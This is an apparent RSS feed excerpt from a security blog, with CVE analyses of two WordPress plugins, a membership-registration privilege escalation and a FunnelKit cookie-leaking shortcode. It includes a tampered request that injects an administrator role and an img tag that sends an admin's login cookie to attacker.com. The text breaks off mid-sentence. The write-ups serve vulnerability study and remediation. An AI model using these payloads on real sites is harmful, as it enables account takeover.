4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Access the membership registration endpoint (&lt;code&gt;/membership-registration/&lt;/code&gt;) and start a registration while enabling &lt;strong&gt;Burp Intercept&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Forward the requests until reaching the request with the action &lt;strong&gt;&lt;code&gt;user_registration_membership_register_member&lt;/code&gt;&lt;/strong&gt;, then modify the &lt;strong&gt;&lt;code&gt;members_data&lt;/code&gt;&lt;/strong&gt; parameter by adding &lt;strong&gt;&lt;code&gt;&amp;quot;role&amp;quot;:&amp;quot;administrator&amp;quot;&lt;/code&gt;&lt;/strong&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&amp;#34;membership&amp;#34;:&amp;#34;406&amp;#34;,&amp;#34;total&amp;#34;:&amp;#34;0&amp;#34;,&amp;#34;payment_method&amp;#34;:&amp;#34;free&amp;#34;,&amp;#34;start_date&amp;#34;:&amp;#34;2026-1-7&amp;#34;,&amp;#34;username&amp;#34;:&amp;#34;hacker&amp;#34;,&amp;#34;role&amp;#34;:&amp;#34;administrator&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Forward the modified request.&lt;/li&gt;&#xA;&lt;li&gt;Log in with the newly created account and verify the privileges.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-2563 arises because the plugin exposes a public AJAX endpoint for membership registration and &lt;strong&gt;directly trusts client-supplied input&lt;/strong&gt;, especially the &lt;code&gt;role&lt;/code&gt; parameter. Without validation or a whitelist, an unauthenticated attacker can inject &lt;code&gt;administrator&lt;/code&gt; and have the system assign elevated privileges via &lt;code&gt;WP_User::set_role()&lt;/code&gt;.&#xA;Version 4.1.2 fully addresses the issue by &lt;strong&gt;removing any reliance on client-provided role values&lt;/strong&gt; and deriving the role exclusively from trusted server-side membership metadata, effectively preventing privilege escalation.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Never trust client input for sensitive attributes such as &lt;strong&gt;roles or privileges&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Public endpoints (&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt;) must be carefully reviewed for &lt;strong&gt;access control and impact scope&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Nonce mechanisms only protect against CSRF and &lt;strong&gt;do not replace authorization or input validation&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Always enforce &lt;strong&gt;server-side validation and whitelisting&lt;/strong&gt; for security-critical fields.&lt;/li&gt;&#xA;&lt;li&gt;Diffing patched versions is an effective way to identify &lt;strong&gt;root causes and remediation strategies&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/user-registration/vulnerability/wordpress-user-registration-membership-plugin-4-1-2-unauthenticated-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress User Registration Plugin &amp;lt; 4.1.2 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-7654 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2026-01-06-cve-2025-7654/</link>
      <pubDate>Tue, 06 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2026-01-06-cve-2025-7654/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Multiple &lt;strong&gt;FunnelKit&lt;/strong&gt; plugins across different versions contain a &lt;strong&gt;sensitive information disclosure&lt;/strong&gt; vulnerability that can lead to &lt;strong&gt;privilege escalation&lt;/strong&gt; via the &lt;strong&gt;WooFunnels&lt;/strong&gt; library.&#xA;This vulnerability allows &lt;strong&gt;authenticated users with Contributor privileges or higher&lt;/strong&gt; to access and abuse a function in the WooFunnels library to &lt;strong&gt;extract sensitive information&lt;/strong&gt;, including &lt;strong&gt;authentication cookies&lt;/strong&gt; of other users.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-7654&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-7654&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.11.0.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.11.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (8.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ultimate-post/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Funnel Builder by FunnelKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; – &lt;strong&gt;Funnel Builder by FunnelKit&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.11.0.2&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.12.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;WooCommerce Plugin&lt;/strong&gt; → &lt;a href=&#34;https://wordpress.org/plugins/woocommerce/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;WooCommerce&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;ul&gt;&#xA;&lt;li&gt;Although the CVE disclosure states that the issue was fixed in version &lt;code&gt;3.11.1&lt;/code&gt;, in practice the fix was only fully applied starting from version &lt;code&gt;3.12.0&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;The plugin &lt;strong&gt;requires WooCommerce to operate&lt;/strong&gt;, as it is &lt;strong&gt;directly integrated with and dependent on WooCommerce&lt;/strong&gt;; it can only be activated when &lt;strong&gt;WooCommerce&lt;/strong&gt; is installed and activated.&lt;/li&gt;&#xA;&lt;/ul&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers the following shortcodes:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public $shortcodes = array(&#xA;    &amp;#39;get_cookie&amp;#39;,&#xA;    &amp;#39;get_url_parameter&amp;#39;,&#xA;);&#xA;&#xA;public function __construct() {&#xA;    foreach ( $this-&amp;gt;shortcodes as $code ) {&#xA;        add_shortcode( &amp;#39;wf_&amp;#39; . $code, array( $this, $code ) );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With this configuration, the plugin creates two shortcodes mapped to two callback functions:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Shortcode &lt;code&gt;wf_get_cookie&lt;/code&gt; → callback &lt;code&gt;get_cookie&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Shortcode &lt;code&gt;wf_get_url_parameter&lt;/code&gt; → callback &lt;code&gt;get_url_parameter&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Among these, the &lt;code&gt;wf_get_cookie&lt;/code&gt; shortcode is directly related to the security issue.&lt;/p&gt;&#xA;&lt;p&gt;When this shortcode is embedded into a post or page, the &lt;code&gt;get_cookie&lt;/code&gt; callback is invoked:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_cookie( $attr ) {&#xA;    $attr = shortcode_atts( array(&#xA;        &amp;#39;key&amp;#39; =&amp;gt; &amp;#39;&amp;#39;,&#xA;    ), $attr );&#xA;&#xA;    if ( empty( $attr[&amp;#39;key&amp;#39;] ) ) {&#xA;        return &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    $data = isset( $_COOKIE[ $attr[&amp;#39;key&amp;#39;] ] ) ? bwf_clean( $_COOKIE[ $attr[&amp;#39;key&amp;#39;] ] ) : &amp;#39;&amp;#39;;&#xA;&#xA;    /*** read cookie when drop cookie on page **/&#xA;    if ( empty( $data ) ) {&#xA;        $key  = str_replace( &amp;#39;bwf_&amp;#39;, &amp;#39;&amp;#39;, $attr[&amp;#39;key&amp;#39;] );&#xA;        $data = isset( $_GET[ $key ] ) ? bwf_clean( $_GET[ $key ] ) : &amp;#39;&amp;#39;;&#xA;    }&#xA;&#xA;    return $data;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;get_cookie&lt;/code&gt; function allows direct reading of cookie values from the global &lt;code&gt;$_COOKIE&lt;/code&gt; variable and assigns them to &lt;code&gt;$data&lt;/code&gt;. &lt;strong&gt;If &lt;code&gt;$data&lt;/code&gt; is not empty&lt;/strong&gt;, the function completely skips the &lt;code&gt;$_GET&lt;/code&gt; branch and &lt;strong&gt;returns the cookie value directly&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;For example, when the following shortcode is embedded in a post:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;[wf_get_cookie key=&amp;#39;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&amp;#39;]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When a &lt;strong&gt;logged-in user&lt;/strong&gt; visits this post, the shortcode is processed server-side and the value of the cookie &lt;code&gt;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&lt;/code&gt; belonging to &lt;strong&gt;the visiting user&lt;/strong&gt; is rendered directly into the post content.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/cookie.png&#34; title=&#34;Cookie displayed in post&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/cookie.png&#34; data-sub-html=&#34;&lt;h2&gt;Cookie&lt;/h2&gt;&lt;p&gt;Cookie displayed in post&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/cookie.png&#39; alt=&#34;Cookie&#34; height=&#34;631&#34; width=&#34;1914&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cookie displayed in post&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;At first glance, this may appear “harmless”, since each user only sees &lt;strong&gt;their own&lt;/strong&gt; cookie. However, the problem is that shortcodes are not limited to rendering text; they can also be embedded inside &lt;strong&gt;HTML attributes&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;An attacker with &lt;strong&gt;Contributor&lt;/strong&gt; privileges can inject the shortcode into the &lt;code&gt;src&lt;/code&gt; attribute of an &lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt; tag as follows:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&amp;#34;http://attacker.com/[wf_get_cookie key=&amp;#39;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&amp;#39;]&amp;#34;&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When an &lt;strong&gt;administrator&lt;/strong&gt; logs in and opens this post, the shortcode is processed and the admin’s login cookie is directly injected into the image URL. The browser then sends a request to the attacker’s server, unintentionally carrying the &lt;strong&gt;admin authentication cookie&lt;/strong&gt; within the URL.&lt;/p&gt;&#xA;&lt;p&gt;👉 At this point, the cookie is no longer “only visible to the viewer”, but has been &lt;strong&gt;exfiltrated externally&lt;/strong&gt;, enabling account takeover and privilege escalation.&lt;/p&gt;&#xA;&lt;p&gt;However, it is important to identify which cookie is actually valuable for exploitation.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/cookie_new.png&#34; title=&#34;Cookie set after successful login&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/cookie_new.png&#34; data-sub-html=&#34;&lt;h2&gt;Cookie&lt;/h2&gt;&lt;p&gt;Cookie set after successful login&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/cookie_new.png&#39; alt=&#34;Cookie&#34; height=&#34;797&#34; width=&#34;1914&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cookie set after successful login&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;When a user successfully logs into WordPress, the system sets two main authentication cookies:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wordpress_86a9106ae65537651a8e456835b316ab&lt;/code&gt;: applies to &lt;code&gt;/wp-content/plugins&lt;/code&gt; and &lt;code&gt;/wp-admin&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wordpress_logged_in_86a9106ae65537651a8e456835b316ab&lt;/code&gt;: applies to &lt;code&gt;/&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;The string &lt;code&gt;86a9106ae65537651a8e456835b316ab&lt;/code&gt; is a &lt;strong&gt;hash derived from the site URL&lt;/strong&gt;, specifically &lt;code&gt;md5(&#39;http://localhost&#39;)&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;According to &lt;a href=&#34;https://datatracker.ietf.org/doc/html/rfc6265#section-5.2.4&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;RFC 6265&lt;/a&gt;, section &lt;strong&gt;5.2.4 – Path Attribute&lt;/strong&gt;, this standard defines how browsers handle the &lt;code&gt;Path&lt;/code&gt; attribute of cookies:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/path.png&#34; title=&#34;Path attribute per RFC 6265&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/path.png&#34; data-sub-html=&#34;&lt;h2&gt;Path&lt;/h2&gt;&lt;p&gt;Path attribute per RFC 6265&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/path.png&#39; alt=&#34;Path&#34; height=&#34;354&#34; width=&#34;757&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Path attribute per RFC 6265&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;This means:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;The &lt;code&gt;Path&lt;/code&gt; attribute defines the &lt;strong&gt;URL path scope&lt;/strong&gt; for which a cookie will be included in HTTP requests.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Path attribute recognition&lt;/strong&gt;: If the attribute name (case-insensitive) is &lt;code&gt;Path&lt;/code&gt;, the browser must process it according to the following rules.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;If &lt;code&gt;Path&lt;/code&gt; is empty or invalid&lt;/strong&gt; (does not start with &lt;code&gt;/&lt;/code&gt;):&#xA;The browser assigns the cookie-path to the &lt;strong&gt;default-path&lt;/strong&gt;, derived from the URL that created the cookie.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-06-cve-2025-7654/default.png&#34; title=&#34;default-path per RFC 6265&#34; data-thumbnail=&#34;/posts/2026-01-06-cve-2025-7654/default.png&#34; data-sub-html=&#34;&lt;h2&gt;Default&lt;/h2&gt;&lt;p&gt;default-path per RFC 6265&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-06-cve-2025-7654/default.png&#39; alt=&#34;Default&#34; height=&#34;860&#34; width=&#34;771&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;default-path per RFC 6265&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;According to section &lt;strong&gt;5.1.4 – Paths and Path-Match&lt;/strong&gt; of RFC 6265, the &lt;code&gt;default-path&lt;/code&gt; is computed as follows:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;uri-path&lt;/code&gt;: the path component of the request URI (excluding the query string).&lt;/li&gt;&#xA;&lt;li&gt;If &lt;code&gt;uri-path&lt;/code&gt; is empty or does not start with &lt;code&gt;/&lt;/code&gt;, the default-path is &lt;code&gt;/&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;If &lt;code&gt;uri-path&lt;/code&gt; contains only &lt;code&gt;/&lt;/code&gt;, the default-path is &lt;code&gt;/&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Otherwise, the default-path is the substring of 